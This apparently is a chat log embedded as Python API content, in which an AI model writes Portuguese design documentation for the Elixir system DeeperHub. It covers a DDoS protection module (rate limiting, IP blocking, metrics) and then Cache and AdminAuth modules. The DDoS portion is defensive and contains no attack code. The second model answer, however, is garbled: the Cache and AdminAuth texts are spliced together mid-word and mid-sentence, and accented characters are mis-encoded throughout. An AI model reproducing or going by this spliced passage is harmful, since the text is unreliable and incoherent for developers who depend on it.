    *   Capacidade de interagir com Web Application Firewalls (WAFs) ou servi√ßos de mitiga√ß√£o DDoS externos para coordenar respostas (ex: reportar IPs atacantes, receber listas de bloqueio).
*   **Configurabilidade:**
    *   Pol√≠ticas de rate limiting, limiares de detec√ß√£o de ataque, dura√ß√£o de bloqueios.

## üèóÔ∏è 3. Arquitetura e Design

### 3.1. Componentes Principais

1.  **`DeeperHub.Security.DdosProtection` (Fachada P√∫blica):**
    *   Ponto de entrada para as funcionalidades de prote√ß√£o DDoS.
    *   Delega para o `DdosProtectionService`.
2.  **`DeeperHub.Security.DdosProtection.Services.DdosProtectionService` (GenServer ou M√≥dulo Funcional com Estado em ETS):**
    *   **Responsabilidade:** L√≥gica principal para monitorar tr√°fego, aplicar limites de taxa (espec√≠ficos para DDoS, complementando o rate limiter da API), detectar padr√µes de ataque e gerenciar o modo de prote√ß√£o avan√ßada.
    *   **Estado (se GenServer/ETS):** Contadores de requisi√ß√µes por IP/path, estado do modo de prote√ß√£o avan√ßada, limiares din√¢micos.
    *   **Intera√ß√µes:**
        *   `DeeperHub.API.RateLimiterFacade`: Pode usar este para a mec√¢nica de rate limiting, mas com pol√≠ticas espec√≠ficas para DDoS.
        *   `DeeperHub.Security.IPFirewallService`: Para bloquear/desbloquear IPs.
        *   `DeeperHub.Core.ConfigManager` / `SecurityPolicyManager`: Para obter pol√≠ticas e limiares.
        *   `DeeperHub.Security.Monitoring`: Para registrar alertas de DDoS.
3.  **`DeeperHub.Security.Plugs.DdosProtectionPlug` (Phoenix Plug, Opcional):**
    *   **Responsabilidade:** Interceptar todas ou um subconjunto de requisi√ß√µes para aplicar verifica√ß√µes de DDoS (`check_request/3`) e registrar tr√°fego (`record_request/3`).
    *   Este plug deve ser um dos primeiros no pipeline.
4.  **`DeeperHub.Security.DdosProtection.PatternAnalyzer` (M√≥dulo Funcional ou Worker):**
    *   **Responsabilidade:** Analisar logs de tr√°fego ou dados em tempo real para identificar padr√µes de ataque mais complexos (ex: distribui√ß√£o de User-Agents, tipos de requisi√ß√£o, etc.).
5.  **Adaptadores para Servi√ßos Externos de Mitiga√ß√£o (Opcional):**
    *   M√≥dulos para interagir com APIs de Cloudflare, AWS Shield, etc.

### 3.2. Estrutura de Diret√≥rios (Proposta)

```
lib/deeper_hub/security/ddos_protection/
‚îú‚îÄ‚îÄ ddos_protection.ex                # Fachada P√∫blica
‚îÇ
‚îú‚îÄ‚îÄ services/
‚îÇ   ‚îî‚îÄ‚îÄ ddos_protection_service.ex    # L√≥gica principal
‚îÇ
‚îú‚îÄ‚îÄ plug/                             # (Pode estar em deeper_hub_web/plugs)
‚îÇ   ‚îî‚îÄ‚îÄ ddos_protection_plug.ex
‚îÇ
‚îú‚îÄ‚îÄ pattern_analyzer.ex               # (Opcional)
‚îÇ
‚îî‚îÄ‚îÄ supervisor.ex                     # Supervisor (se o servi√ßo principal for GenServer)
```
*(O `DdosProtectionAdapter` e `DdosProtectionBehaviour` da documenta√ß√£o original s√£o consolidados aqui, assumindo uma implementa√ß√£o principal.)*

### 3.3. Decis√µes de Design Importantes

*   **Performance Cr√≠tica:** As verifica√ß√µes de DDoS devem ter um impacto m√≠nimo na lat√™ncia das requisi√ß√µes normais. O uso de ETS para contadores de taxa √© comum.
*   **M√∫ltiplas Camadas:** A prote√ß√£o DDoS eficaz geralmente envolve m√∫ltiplas camadas:
    *   **N√≠vel de Rede/Infraestrutura:** Idealmente, a primeira linha de defesa √© em um n√≠vel anterior √† aplica√ß√£o (firewall de rede, provedor de CDN/DDoS).
    *   **N√≠vel de Aplica√ß√£o (este m√≥dulo):** Lida com ataques que passam pela primeira camada, focando em HTTP floods e abuso de recursos da aplica√ß√£o.
*   **Falsos Positivos:** Pol√≠ticas muito agressivas podem bloquear tr√°fego leg√≠timo, especialmente durante picos de uso normais. A calibra√ß√£o e o modo \"monitor\" s√£o importantes.
*   **Adapta√ß√£o:** O sistema deve ser capaz de se adaptar a novos vetores de ataque. O modo de prote√ß√£o avan√ßada e a capacidade de atualizar regras/limiares dinamicamente s√£o importantes.

## üõ†Ô∏è 4. Casos de Uso Principais

*   **HTTP Flood Simples em um Endpoint:**
    *   Muitas requisi√ß√µes de um ou poucos IPs para `/api/search`.
    *   `DdosProtectionPlug` chama `record_request/3` para cada uma.
    *   `DdosProtectionService` detecta que o limite de taxa para esses IPs ou para o endpoint `/api/search` foi excedido.
    *   Chama `IPFirewallService.block_ip/3` para bloquear os IPs atacantes.
    *   Requisi√ß√µes subsequentes desses IPs s√£o bloqueadas pelo `IPFirewallPlug`.
*   **Ataque Distribu√≠do Lento e Baixo (Low and Slow):**
    *   Muitos IPs diferentes fazem um n√∫mero de requisi√ß√µes um pouco acima do normal, mas individualmente n√£o disparam limites de taxa simples.
    *   `DdosProtection.PatternAnalyzer` (rodando em background ou analisando logs) detecta um aumento geral no tr√°fego para certos endpoints ou um padr√£o suspeito nos User-Agents.
    *   Um administrador √© alertado ou o sistema entra automaticamente em um modo de prote√ß√£o avan√ßada.
*   **Administrador Ativa Modo de Prote√ß√£o Avan√ßada:**
    *   Durante um ataque percebido, um admin chama `DdosProtection.set_advanced_protection(true, %{global_rate_limit: 10})`.
    *   O `DdosProtectionService` ajusta suas pol√≠ticas, e o `DdosProtectionPlug` come√ßa a aplicar limites mais rigorosos ou desafios CAPTCHA.

## üåä 5. Fluxos Importantes

### Fluxo de Verifica√ß√£o de Requisi√ß√£o pelo `DdosProtectionPlug`

1.  **Requisi√ß√£o Entra:** Chega uma nova requisi√ß√£o HTTP.
2.  **`DdosProtectionPlug.call/2`:**
    *   Extrai IP do cliente, path, etc.
    *   Chama `DeeperHub.Security.IPFirewallService.is_blocked?(client_ip)`. Se bloqueado, retorna 403.
    *   Chama `DeeperHub.Security.DdosProtection.check_request(client_ip, path, context)`.
3.  **`DdosProtectionService.check_request/3`:**
    *   Consulta as pol√≠ticas de rate limiting atuais (globais, por path, modo de prote√ß√£o avan√ßada).
    *   Verifica o contador de requisi√ß√µes para o `client_ip` e/ou `path` (usando `DeeperHub.API.RateLimiterFacade` ou l√≥gica interna).
    *   **Se Limite Excedido:**
        *   Retorna `{:ok, :rate_limited}` para o Plug.
        *   (Opcional) Registra o IP para poss√≠vel bloqueio se o comportamento persistir.
    *   **Se Dentro do Limite:**
        *   Chama `record_request/3` para incrementar o contador.
        *   Retorna `{:ok, :allowed}` para o Plug.
4.  **`DdosProtectionPlug.call/2`:**
    *   Se `:rate_limited`, retorna uma resposta `429 Too Many Requests` e interrompe a `conn`.
    *   Se `:allowed`, a requisi√ß√£o prossegue.

## üì° 6. API (Fun√ß√µes P√∫blicas da Fachada)

### 6.1. `DeeperHub.Security.DdosProtection.check_request(ip_address :: String.t(), path :: String.t(), context :: map()) :: {:ok, :allowed | :rate_limited | :blocked_by_ddos_policy} | {:error, term()}`

*   **Descri√ß√£o:** Verifica se uma requisi√ß√£o de um IP para um path deve ser permitida, limitada por taxa ou bloqueada com base nas pol√≠ticas de DDoS. Esta fun√ß√£o √© mais espec√≠fica que um rate limiter gen√©rico, pois pode considerar o estado geral de \"sob ataque\".
*   **`context`:** Pode incluir `%{method: \"GET\", headers: %{...}}`.
*   **Retorno:** `:allowed`, `:rate_limited` (com info de retry), ou `:blocked_by_ddos_policy`.

### 6.2. `DeeperHub.Security.DdosProtection.record_request(ip_address :: String.t(), path :: String.t(), context :: map()) :: :ok`

*   **Descri√ß√£o:** Registra uma requisi√ß√£o para contagem e an√°lise de padr√µes. Chamado se `check_request` permitir.

### 6.3. `DeeperHub.Security.DdosProtection.block_ip(ip_address :: String.t(), reason :: String.t(), duration_seconds :: integer() | nil) :: :ok | {:error, term()}`

*   **Descri√ß√£o:** Bloqueia um IP especificamente devido a atividade DDoS. Delega para `IPFirewallService` mas com um motivo espec√≠fico de DDoS.

### 6.4. `DeeperHub.Security.DdosProtection.unblock_ip(ip_address :: String.t()) :: :ok | {:error, term()}`

*   **Descri√ß√£o:** Desbloqueia um IP que foi bloqueado por pol√≠ticas de DDoS.

### 6.5. `DeeperHub.Security.DdosProtection.configure_rate_limit(path_pattern :: String.t(), requests_per_window :: integer(), window_seconds :: integer(), opts :: keyword()) :: :ok | {:error, term()}`

*   **Descri√ß√£o:** Configura ou atualiza uma regra de rate limiting espec√≠fica para prote√ß√£o DDoS em um padr√£o de path.
*   **`opts`:** Pode incluir `:burst_limit`.

### 6.6. `DeeperHub.Security.DdosProtection.set_advanced_protection(enabled :: boolean(), opts :: keyword()) :: :ok`

*   **Descri√ß√£o:** Ativa ou desativa o modo de prote√ß√£o avan√ßada.
*   **`opts`:** Pode incluir `:global_rate_limit_per_ip`, `:challenge_all_new_ips` (boolean).

### 6.7. `DeeperHub.Security.DdosProtection.get_statistics(period :: atom()) :: {:ok, map()}`

*   **Descri√ß√£o:** Obt√©m estat√≠sticas sobre atividade DDoS e a√ß√µes de mitiga√ß√£o.
*   **`period`:** `:current`, `:last_hour`, `:last_day`.

## ‚öôÔ∏è 7. Configura√ß√£o

Via `DeeperHub.Core.ConfigManager` e/ou `DeeperHub.Security.Policy.SecurityPolicyManager`:

*   **`[:security, :ddos_protection, :enabled]`** (Boolean): Habilita/desabilita o m√≥dulo. (Padr√£o: `true`)
*   **`[:security, :ddos_protection, :default_ip_rate_limit, :requests]`** (Integer): Limite global de requisi√ß√µes por IP.
*   **`[:security, :ddos_protection, :default_ip_rate_limit, :window_seconds]`** (Integer): Janela para o limite global.
*   **`[:security, :ddos_protection, :auto_block, :threshold_factor]`** (Float): Fator acima do limite de taxa para considerar auto-bloqueio de IP (ex: 2.0 = o dobro do limite de taxa).
*   **`[:security, :ddos_protection, :auto_block, :duration_seconds]`** (Integer): Dura√ß√£o do auto-bloqueio.
*   **`[:security, :ddos_protection, :advanced_mode_settings, :global_rate_limit_per_ip]`** (Integer): Limite de taxa mais restrito quando em modo avan√ßado.
*   **`[:security, :ddos_protection, :advanced_mode_settings, :challenge_new_ips_enabled]`** (Boolean).
*   **`[:security, :ddos_protection, :pattern_analyzer, :log_source]`** (String/Module): Fonte dos logs de tr√°fego para an√°lise de padr√µes.
*   **`[:security, :ddos_protection, :notification_thresholds, :requests_per_second_global]`** (Integer): Limiar de RPS global para disparar um alerta de poss√≠vel DDoS.

## üîó 8. Depend√™ncias

### 8.1. M√≥dulos Internos

*   `DeeperHub.Core.ConfigManager`, `Core.Logger`, `Core.Metrics`.
*   `DeeperHub.Security.IPFirewallService`: Para efetivamente bloquear/desbloquear IPs.
*   `DeeperHub.API.RateLimiterFacade`: Para a mec√¢nica de contagem de taxa.
*   `DeeperHub.Security.Monitoring`: Para enviar alertas.
*   `DeeperHub.Audit`: Para registrar a√ß√µes de bloqueio.

### 8.2. Bibliotecas Externas

*   Nenhuma espec√≠fica para a l√≥gica central, mas pode usar bibliotecas de an√°lise de log se o `PatternAnalyzer` for complexo.

## ü§ù 9. Como Usar / Integra√ß√£o

*   **Plug no Pipeline Phoenix (Essencial):**
    ```elixir
    # Em lib/deeper_hub_web/router.ex
    pipeline :secure_api do
      plug DeeperHub.Security.Plugs.IPFirewallPlug # Primeiro, IPs j√° conhecidos como maus
      plug DeeperHub.Security.Plugs.DdosProtectionPlug # Depois, l√≥gicas de DDoS
      # ... outros plugs de seguran√ßa e API ...
    end
    ```
*   **Chamadas de Servi√ßos de Monitoramento:** Servi√ßos que monitoram o estado geral do sistema podem chamar `DdosProtection.get_statistics/1` e, se certos limiares forem atingidos, podem chamar `DdosProtection.set_advanced_protection(true, ...)`.

## ‚úÖ 10. Testes e Observabilidade

### 10.1. Testes

*   Testar o `DdosProtectionPlug` para garantir que ele bloqueia/limita requisi√ß√µes corretamente.
*   Testar a l√≥gica do `DdosProtectionService` para diferentes padr√µes de tr√°fego (normal, pico, flood).
*   Testar a ativa√ß√£o e os efeitos do modo de prote√ß√£o avan√ßada.
*   Testar a integra√ß√£o com `IPFirewallService` para bloqueios.
*   Localiza√ß√£o: `test/deeper_hub/security/ddos_protection/`.

### 10.2. M√©tricas

*   `deeper_hub.security.ddos.requests_processed.count` (tags: `path`, `action_taken` (`allowed`, `rate_limited`, `blocked`))
*   `deeper_hub.security.ddos.global_rps.gauge` (Gauge): Requisi√ß√µes por segundo globais para a aplica√ß√£o.
*   `deeper_hub.security.ddos.ip_blocked_ddos.count` (tags: `reason`)
*   `deeper_hub.security.ddos.advanced_mode_active.gauge` (Gauge, 0 ou 1)

### 10.3. Logs

*   **N√≠vel INFO:** Transi√ß√£o para/de modo de prote√ß√£o avan√ßada.
*   **N√≠vel WARNING:** IP bloqueado devido a atividade DDoS. Limite de taxa global se aproximando de um limiar de alerta.
*   **N√≠vel ERROR:** Falha ao aplicar uma pol√≠tica de DDoS.

### 10.4. Telemetria

*   `[:deeper_hub, :security, :ddos, :request_checked]`
    *   Metadados: `%{ip: ip, path: path, result: :allowed | :rate_limited | :blocked, current_rps_for_ip: rps}`
*   `[:deeper_hub, :security, :ddos, :ip_action]`
    *   Metadados: `%{ip: ip, action: :blocked | :unblocked, reason: reason, duration: dur}`
*   `[:deeper_hub, :security, :ddos, :protection_mode_changed]`
    *   Metadados: `%{new_mode: :standard | :advanced, triggered_by: :manual | :auto}`

## ‚ùå 11. Tratamento de Erros

*   Falhas no servi√ßo de DDoS n√£o devem impedir o tr√°fego leg√≠timo se poss√≠vel (ex: falha segura para o modo \"permitir\").
*   Erros ao interagir com `IPFirewallService` ou `RateLimiterFacade` devem ser logados, e o sistema de DDoS pode precisar operar em modo degradado.

## üõ°Ô∏è 12. Considera√ß√µes de Seguran√ßa (do pr√≥prio M√≥dulo)

*   **Falsos Positivos:** Bloquear IPs leg√≠timos √© um risco. As pol√≠ticas devem ser cuidadosamente calibradas. O modo \"monitor\" ou desafios (CAPTCHA) podem ser usados antes de bloqueios agressivos.
*   **Evas√£o:** Atacantes sofisticados usar√£o redes de bots distribu√≠das. A prote√ß√£o no n√≠vel da aplica√ß√£o √© apenas uma camada.
*   **Satura√ß√£o de Recursos do Pr√≥prio M√≥dulo:** Se o rastreamento de cada requisi√ß√£o for muito custoso, o pr√≥prio m√≥dulo de prote√ß√£o DDoS pode se tornar um gargalo. O uso de ETS e amostragem para an√°lise de padr√µes pode ser necess√°rio.

## üßë‚Äçüíª 13. Contribui√ß√£o

*   Novas regras de detec√ß√£o de padr√µes devem ser testadas contra tr√°fego real ou simulado.
*   A integra√ß√£o com WAFs ou servi√ßos de mitiga√ß√£o de nuvem deve ser feita atrav√©s de adaptadores claros.

## üîÆ 14. Melhorias Futuras e TODOs

*   [ ] Implementar detec√ß√£o de padr√µes de ataque mais sofisticados no `PatternAnalyzer` (ex: an√°lise de User-Agent, frequ√™ncia de tipos de requisi√ß√£o por IP).
*   [ ] Adicionar desafios JavaScript \"I'm not a robot\" como uma etapa antes do CAPTCHA completo para tr√°fego levemente suspeito.
*   [ ] Permitir que as pol√≠ticas de DDoS sejam ajustadas dinamicamente com base na carga atual do sistema ou em alertas de outros sistemas de monitoramento.
*   [ ] Integra√ß√£o com feeds de IP de botnets conhecidas para popular proativamente as blocklists.
*   [ ] Suporte para \"fingerprinting\" de cliente mais avan√ßado para diferenciar bots de tr√°fego humano, mesmo de IPs compartilhados.

---

*√öltima atualiza√ß√£o: 2025-05-12*

---

Com isso, cobrimos uma parte significativa da prote√ß√£o de entrada.

O que voc√™ gostaria de ver em seguida?
Podemos continuar com os outros m√≥dulos de seguran√ßa como `SqlInjectionProtection` (que j√° documentamos) ou `PathTraversalProtection` (tamb√©m j√° documentado), ou talvez mudar o foco para algo no Core como `DeeperHub.Core.Cache` ou `DeeperHub.Core.Repo`?"""),
            ],
        ),
        types.Content(
            role="user",
            parts=[
                types.Part.from_text(text="""continue"""),
            ],
        ),
        types.Content(
            role="model",
            parts=[
                types.Part.from_text(text="""J√° documentamos `DeeperHub.Security.SqlInjectionProtection` e `DeeperHub.Security.PathTraversalProtection`.

Dado que o `DeeperHub.Core.Cache` foi mencionado como uma depend√™ncia e otimiza√ß√£o em v√°rios m√≥dulos, vamos detalh√°-lo agora. √â um componente de infraestrutura essencial.

---

# M√≥dulo: `DeeperHub.Core.Cache` üöÄ

## üìú 1. Vis√£o Geral do M√≥dulo `DeeperHub.Core.Cache`

O m√≥dulo `DeeperHub.Core.Cache` fornece uma **fachada e um servi√ßo de caching gen√©rico** para o sistema DeeperHub. Seu prop√≥sito √© melhorar o desempenho da aplica√ß√£o armazenando temporariamente dados frequentemente acessados ou resultados de opera√ß√µes custosas, reduzindo a lat√™ncia e a carga sobre fontes de dados prim√°rias (como bancos de dados ou APIs externas).

Ele oferece uma API simples para opera√ß√µes de cache como `put`, `get`, `delete`, e `get_or_store`, abstraindo a implementa√ß√£o de cache subjacente (que pode ser ETS, Redis, Memcached, etc., atrav√©s de um `CacheAdapter`). üòä

*(Nota: A documenta√ß√£o original tem `DeeperHub.Shared.Cache` e `DeeperHub.Shared.Cache.CacheService` e `CacheAdapter`. Esta documenta√ß√£o consolida a fachada principal em `DeeperHub.Core.Cache` e assume que a l√≥gica de servi√ßo e adapta√ß√£o reside em `DeeperHub.Shared.Cache.*` ou √© diretamente gerenciada pela fachada se for uma implementa√ß√£o simples como ETS.)*

## üéØ 2. Responsabilidades e Funcionalidades Chave

*   **Armazenamento Chave-Valor:**
    *   Armazenar dados associados a uma chave √∫nica (`put/4`).
    *   Recuperar dados com base em uma chave (`get/3`).
*   **Expira√ß√£o de Cache (TTL - Time To Live):**
    *   Permitir a defini√ß√£o de um tempo de vida para cada entrada de cache.
    *   Automaticamente considerar entradas expiradas como \"misses\".
*   **Invalida√ß√£o de Cache:**
    *   Remover entradas espec√≠ficas do cache (`delete/2`).
    *   Remover todas as entradas de um namespace (se suportado) ou o cache inteiro (`clear/1`).
    *   Remover entradas que correspondem a um padr√£o de chave (`delete_pattern/2`).
*   **Opera√ß√£o \"Get-Or-Store\" (`get_or_store/4`):**
    *   Tentar obter um valor do cache; se for um \"miss\" (n√£o encontrado ou expirado), executar uma fun√ß√£o fornecida para gerar o valor, armazen√°-lo no cache e ent√£o retorn√°-lo.
*   **Suporte a Namespaces (Opcional):**
    *   Permitir a organiza√ß√£o de chaves de cache em namespaces para evitar colis√µes e facilitar a invalida√ß√£o em grupo.
*   **Opera√ß√µes At√¥micas (Opcional, dependendo do backend):**
    *   Suporte para opera√ß√µes como `increment/4` e `decrement/4` para contadores em cache.
    *   Suporte para opera√ß√µes em conjuntos (ex: `add_to_set/3`).
*   **Abstra√ß√£o de Backend de Cache:**
    *   Fornecer uma interface (`CacheBehaviour`) para que diferentes backends de cache (ETS, Redis, etc.) possam ser usados de forma intercambi√°vel.
*   **M√©tricas e Observabilidade:**
    *   Registrar m√©tricas como taxa de acerto (hit rate), taxa de erro (miss rate), tamanho do cache, lat√™ncia das opera√ß√µes de cache.
*   **Limpeza de Entradas Expiradas (para backends que n√£o fazem isso automaticamente):**
    *   ImplementJ√° detalhamos `DeeperHub.Security.SqlInjectionProtection` e `DeeperHub.Security.ar ou configurar um mecanismo para remover periodicamente entradas expiradas para liberar mem√≥ria (especialmente para caches em mem√≥ria como ETS).

## üèóÔ∏è 3. Arquitetura e Design

### 3.1. Componentes Principais

1.PathTraversalProtection`.

Que tal seguirmos com `DeeperHub.Security.AdminAuth`? A seguran√ßa da interface administrativa √© um ponto cr√≠tico em qualquer sistema.

---

# M√≥dulo: `DeeperHub.Security  **`DeeperHub.Core.Cache` (Fachada P√∫blica):**
    *   Ponto de entrada para todas as opera√ß√µes de cache.
    *   Delega chamadas para o `DeeperHub.Shared.AdminAuth` üöÄ

## üìú 1. Vis√£o Geral do M√≥dulo `DeeperHub.Security.AdminAuth`

O m√≥dulo `DeeperHub.Security.AdminAuth` √© dedicado especificamente √† **.Cache.CacheAdapter` configurado.
2.  **`DeeperHub.Shared.Cache.CacheAdapter` (GenServer):**
    *   **Responsabilidade:** Gerencia a l√≥gica de intera√ß√£o com a implementa√ß√£o de cache escolhida.
    *   **Interautentica√ß√£o e autoriza√ß√£o de usu√°rios administradores** que acessam as interfaces de gerenciamento e administra√ß√£o do sistema DeeperHub. Elea√ß√µes:** Recebe chamadas da fachada e as traduz para opera√ß√µes no backend de cache (ex: `EtsCache fornece um conjunto de funcionalidades de seguran√ßa mais rigorosas e adaptadas √†s necessidades de contas com privil√©gios elevados.

Is`).
    *   Pode lidar com a l√≥gica de serializa√ß√£o/desserializa√ß√£o se o backend de cache exigir.
3.  **`so pode incluir:
*   Autentica√ß√£o de dois fatores (MFA/TOTP) obrigat√≥ria ou fortementeDeeperHub.Shared.Cache.CacheBehaviour` (Behaviour):**
    *   Define a interface que todas as implementa√ß√µes de backend de cache devem seguir.
4.  **Implementa√ß√µes de Backend de Cache (Exemplos):**
    *    recomendada.
*   Pol√≠ticas de senha mais estritas.
*   Monitoramento e auditoria detalhada de todas**`DeeperHub.Shared.Cache.EtsCache` (GenServer ou m√≥dulo funcional usando ETS):**
        *   Implementa√ß√£o de cache em mem√≥ria usando tabelas ETS.
        *   Gerencia TTLs e limpeza de entradas expiradas.
    *    as a√ß√µes administrativas.
*   Gerenciamento de sess√µes de administrador com timeouts mais curtos.
*   Controle de acesso granular**`DeeperHub.Shared.Cache.RedisAdapter` (M√≥dulo):**
        *   Adaptador para interagir com um servidor Redis externo (usando uma biblioteca como `Redix`).
    *   **`DeeperHub.Shared.Cache.No √†s diferentes funcionalidades administrativas baseado em pap√©is e permiss√µes espec√≠ficas de administra√ß√£o.

O objetivo √© proteger as √°reas mais sens√≠veis do sistema DeeperHub contra acesso n√£o autorizado e abuso de privil√©gios. üòä

*(Nota: Se a autentica√ß√£o de administrOpCache` (M√≥dulo Funcional):**
        *   Uma implementa√ß√£o que n√£o faz nada, efetivamente desabilitando o cache. √ötil para desenvolvimento ou testes.
5.  **`DeeperHub.Shared.Cache.adores for gerenciada pelo mesmo sistema que usu√°rios regulares (`DeeperHub.Auth`) mas com pol√≠ticas diferentes, este m√≥dulo pode atMetricsReporter` (GenServer):**
    *   Coleta e armazena m√©tricas sobre o desempenho do cache.
6uar como uma camada de especializa√ß√£o ou configura√ß√£o sobre `DeeperHub.Auth`. Se for um sistema completamente separado, ele ter√° seus pr√≥prios componentes de login, sess√£o, etc.)*

## üéØ 2. Responsabilidades e Funcional.  **`DeeperHub.Shared.Cache.Supervisor`:**
    *   Supervisiona os processosidades Chave

*   **Autentica√ß√£o de Administradores (`authenticate_admin/3`):**
    *   Ver relacionados ao cache (ex: `CacheAdapter`, `EtsCache GenServer`, `MetricsReporter`).
7.  **Configura√ß√µes (via `DeeperHub.Core.ConfigManager`):**
    *   Qual adaptador de cache usar, TTLificar credenciais (username/password) espec√≠ficas para contas de administrador.
    *   For√ßar ou gerenciar a vers padr√£o, configura√ß√µes espec√≠ficas do backend (ex: URL do Redis).

### 3.2. Estrutura de Diret√≥rios (Proposta para `Shared.Cache`)

```
lib/deeper_hub/shared/cache/
‚îú‚îÄ‚îÄ cache_adapter.ex                # GenServer que delega para a implementa√ß√£o
‚îú‚îÄ‚îÄ cache_behaviour.ex              ifica√ß√£o de Autentica√ß√£o Multifator (MFA), especialmente TOTP (via `AdminTOTPService`).
*# Behaviour para implementa√ß√µes de cache
‚îÇ
‚îú‚îÄ‚îÄ implementations/                # Ou apenas no mesmo n√≠vel se forem poucos
‚îÇ   ‚îú‚îÄ‚îÄ ets_   **Gerenciamento de Contas de Administrador (`create_admin/1`, `update_admin/2`, etc.):**
    *   Cria√ß√£o, atualiza√ß√£o, ativa√ß√£o/desativa√ß√£o de contas de administrador.
    *   Atcache.ex                # Implementa√ß√£o com ETS (pode ser GenServer)
‚îÇ   ‚îú‚îÄ‚îÄ redis_adapter.ex            ribui√ß√£o de pap√©is e permiss√µes administrativas espec√≠ficas (integrando com `DeeperHub.RBAC`).
*   **Pol# Adaptador para Redis
‚îÇ   ‚îî‚îÄ‚îÄ no_op_cache.ex              # Cache que n√£o faz nada
‚îÇ
‚îú‚îÄ‚îÄ metrics_reporter.ex             # GenServer para coletar m√©tricas de cache
‚îú‚îÄ‚îÄ supervisor.ex                   # Supervisor para√≠ticas de Senha de Administrador:**
    *   Aplicar pol√≠ticas de complexidade e expira√ß√£o de senha mais rigorosas para administradores.
*   **Gerenciamento de Sess√µes de Administrador:**
    *   Criar sess√µes com dura√ß√µes e os GenServers do cache
‚îî‚îÄ‚îÄ telemetry.ex                    # Para emitir eventos de telemetria do cache
```
E a fachada em:
```
lib/deeper_hub/core/cache.ex        # Fachada P√∫blica
```

### timeouts de inatividade potencialmente mais curtos.
    *   Invalidar sess√µes de administrador (ex: ap√≥s mudan√ßa de senha, detec√ß√£o de risco).
    *   Gerenciar tokens de sess√£o espec√≠ficos para administradores (via `Admin 3.3. Decis√µes de Design Importantes

*   **Abstra√ß√£o de Backend:** A capacidadeTokenService`).
*   **Autoriza√ß√£o de A√ß√µes Administrativas (`authorize_action/4`, `has_admin de trocar o backend de cache (ex: de ETS para Redis) sem alterar o c√≥digo da aplica√ß√£o √© uma grande vantagem.
*   **Cons_permission?/2`):**
    *   Verificar se um administrador autenticado tem permiss√£o para executar uma a√ß√£o administrativaist√™ncia de Chaves:** Definir uma estrat√©gia clara para nomea√ß√£o de chaves de cache, incluindo namespaces, para evitar colis espec√≠fica ou acessar uma funcionalidade do painel de controle.
    *   Potencialmente exigir verifica√ß√£o MFA adicional para a√ß√µes√µes.
*   **Estrat√©gias de Invalida√ß√£o:** Al√©m do TTL, considerar estrat√©gias de invalida√ß√£o base administrativas de alto risco, mesmo se j√° logado (step-up authentication).
*   **Auditoria Detalhada (`adas em eventos (ex: quando um dado no DB √© atualizado, invalidar a entrada de cache correspondente).
*   **AdminActionLog`):**
    *   Registrar todas as tentativas de login de administrador (sucesso e falTratamento de Falhas no Cache:** Falhas no servi√ßo de cache n√£o devem impedir o funcionamento da aplica√ß√£o. Oha).
    *   Registrar todas as a√ß√µes significativas realizadas por administradores autenticados.
*   **Ger sistema deve ser capaz de operar (com degrada√ß√£o de performance) se o cache estiver indispon√≠vel, buscando osenciamento de Tokens de Administrador (`AdminTokenService`):**
    *   Gera√ß√£o, valida√ß√£o e revoga√ß√£o de tokens de dados da fonte prim√°ria.

## üõ†Ô∏è 4. Casos de Uso Principais

*   **Caching de Dados de Usu√°rio Frequentemente Acessados:**
    *   Ao buscar o perfil de um usu√°rio, o `D sess√£o para administradores.
*   **Prote√ß√£o contra For√ßa Bruta para Login de Admin:**
    *   Aplicar pol√≠ticas de bloqueio mais estritas para tentativas falhas de login de administrador.

## üèóÔ∏è 3. Arquitetura eeeperHub.Accounts.ProfileService` primeiro verifica o cache: `Cache.get(\"user_profile:#{user_id}\")`.
    *   Se for um \"miss\", busca no DB, e depois armazena no cache: Design

A arquitetura pode variar dependendo se √© uma extens√£o do `DeeperHub.Auth` ou um subsistema mais independente. Assumindo uma especializa√ß√£o:

### 3.1. Componentes Principais

1.  ** `Cache.put(\"user_profile:#{user_id}\", profile_data, ttl: 3600)`.
*   **Caching de Resultados de Consultas Complexas:**
    *   Um servi√ßo que gera um relat√≥rio custoso pode usar `Cache`DeeperHub.Security.AdminAuth` (Fachada P√∫blica):**
    *   Ponto de entrada para funcionalidades de autentica√ß√£o e autoriza√ß√£o de administradores.
    *   Delega para `AdminAuthService`..get_or_store(\"reports:monthly_sales:#{month}\", fn -> generate_sales_report(
2.  **`DeeperHub.Security.AdminAuth.Services.AdminAuthService`:**
    *   Servi√ßo central que orquestra a autentica√ß√£o, gerenciamento de contas e verifica√ß√£o de permiss√µes de admin.
    *   Utiliza `month) end, ttl: 86400)`.
*   **Contadores em Cache:**
    *   Rastrear o n√∫mero de visualiza√ß√µes de um post: `Cache.increment(\"post_views:#{post_id}\")AdminTOTPService`, `AdminTokenService`, `PermissionService` (espec√≠fico para admin ou o RBAC geral),`.
*   **Invalida√ß√£o de Cache Baseada em Eventos:**
    *   O `DeeperHub.Accounts.Profile e `AdminActionAuthService`.
3.  **`DeeperHub.Security.AdminAuth.Services.AdminTOTPService`:**
    *   Gerencia a configura√ß√£o e verifica√ß√£o de TOTP para administradores.
4.  **`Service`, ao atualizar um perfil, publica um evento `profile_updated`.
    *   Um assinante desse evento (poderDeeperHub.Security.AdminAuth.Services.AdminTokenService`:**
    *   Gerencia o ciclo de vida de tokens de sess√£o para administradores.
5.  **`DeeperHub.Security.AdminAuth.Services.AdminActionAuthServiceia ser o pr√≥prio `ProfileService` ou um worker dedicado) chama `Cache.delete(\"user_profile:#{updated_user_id}\")`.

## üåä 5. Fluxos Importantes

### Fluxo de `get_or_store/`:**
    *   Verifica se um admin est√° autorizado a realizar uma a√ß√£o espec√≠fica, possivelmente exigindo \"step-up authentication\" com MFA.
6.  **`DeeperHub.Security.AdminAuth.Services4`

1.  **Chamador:** Um servi√ßo chama `DeeperHub.Core.Cache.get_or_store(key, generator_fun, ttl, namespace)`.
2.  **`Core.Cache` (Fachada):.PermissionService` (ou integra√ß√£o com `DeeperHub.RBAC`):**
    *   Define e verifica permiss√µes granulares para o painel de administra√ß√£o (ex: \"gerenciar_usuarios\", \"ver_logs_auditoria\", \"configurar_sistema\").
7.  **Schemas Ecto:**
    *   `D** Delega para `Shared.Cache.CacheAdapter.get_or_store(...)`.
3.  **`Shared.Cache.CacheAdapter`:**
    *   Chama `get(key, namespace)` na implementa√ß√£o de backend configurada (ex: `EtsCache`).
4.  **Backend de Cache (ex: `EtseeperHub.Security.AdminAuth.Schema.AdminSchema`: Para dados da conta de administrador.
    *   `DeeperHub.Security.AdminAuth.Schema.AdminToken`: Para tokens de sess√£o de admin.
    *   `DeeperHub.Security.AdminAuth.Schema.AdminTOTP`: Para configura√ß√µes TOTP de admin.
